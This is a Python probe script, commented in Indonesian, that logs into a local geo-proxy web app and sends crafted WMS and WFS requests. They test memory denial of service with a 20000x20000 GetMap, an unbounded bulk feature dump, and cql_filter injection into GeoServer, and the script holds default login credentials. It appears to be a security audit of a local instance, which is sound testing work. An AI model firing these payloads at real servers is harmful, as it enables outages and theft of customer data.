"""Probe geo-proxy sebagai user login (auth) - DoS + SSRF + kebocoran error."""
import http.cookiejar
import re
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8123"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def go(path, timeout=120):
    t0 = time.time()
    try:
        with op.open(BASE + path, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, len(body), body[:400], resp.headers.get("Content-Type"), (time.time() - t0) * 1000
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, len(body), body[:400], e.headers.get("Content-Type"), (time.time() - t0) * 1000
    except Exception as e:  # noqa: BLE001
        return "ERR", 0, repr(e).encode(), None, (time.time() - t0) * 1000


html = op.open(BASE + "/login", timeout=30).read().decode()
tok = re.search(r'name="_token"\s+value="([^"]+)"', html).group(1)
data = urllib.parse.urlencode({"_token": tok, "username": "suyadi", "password": "password"}).encode()
r = urllib.request.Request(BASE + "/login", data=data)
r.add_header("Content-Type", "application/x-www-form-urlencoded")
with op.open(r, timeout=60) as resp:
    print("login:", resp.status, resp.geturl())

print("\n== G1. proxy tanpa parameter (targetUpstream tanpa query) ==")
print("   ", go("/geo-proxy", timeout=120))

print("\n== G2. GetMap 20000x20000 (DoS memori upstream) ==")
q = ("?SERVICE=WMS&VERSION=1.1.1&REQUEST=GetMap&FORMAT=image/png&TRANSPARENT=true"
     "&LAYERS=webgis:analisa_pelanggan&SRS=EPSG:4326&WIDTH=20000&HEIGHT=20000"
     "&BBOX=109.2,-7.6,109.7,-7.1&STYLES=")
print("   ", go("/geo-proxy" + q, timeout=180))

print("\n== G3. GetMap normal 256x256 (baseline) ==")
q3 = ("?SERVICE=WMS&VERSION=1.1.1&REQUEST=GetMap&FORMAT=image/png&TRANSPARENT=true"
      "&LAYERS=webgis:analisa_pelanggan&SRS=EPSG:4326&WIDTH=256&HEIGHT=256"
      "&BBOX=109.2,-7.6,109.7,-7.1&STYLES=")
print("   ", go("/geo-proxy" + q3, timeout=180))

print("\n== G4. WFS GetFeature tanpa maxFeatures (data dump massal) ==")
q4 = ("?service=WFS&version=1.0.0&request=GetFeature&typeName=webgis:analisa_pelanggan"
      "&outputFormat=application/json")
print("   ", go("/geo-proxy" + q4, timeout=180))

print("\n== G5. injeksi cql_filter (SQLi/ekspresi bebas ke GeoServer) ==")
q5 = ("?SERVICE=WMS&VERSION=1.1.1&REQUEST=GetMap&FORMAT=image/png&TRANSPARENT=true"
      "&LAYERS=webgis:analisa_pelanggan&SRS=EPSG:4326&WIDTH=256&HEIGHT=256"
      "&BBOX=109.2,-7.6,109.7,-7.1&cql_filter=nama%20IS%20NOT%20NULL")
print("   ", go("/geo-proxy" + q5, timeout=180))
